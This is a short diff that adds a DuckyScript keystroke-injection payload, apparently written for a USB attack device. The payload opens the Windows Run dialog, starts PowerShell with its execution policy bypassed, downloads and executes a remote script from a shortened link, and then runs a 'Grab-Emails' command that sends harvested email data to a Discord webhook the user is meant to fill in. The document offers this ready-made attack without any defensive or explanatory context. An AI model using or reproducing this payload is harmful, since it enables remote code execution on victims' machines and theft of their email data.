@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -Ep Bypass irm "t.ly/RajUw"|iex;Grab-Emails -wbhk "YOUR DISCORD WEBHOOK"|Out-Null
+DELAY 300
+ENTER
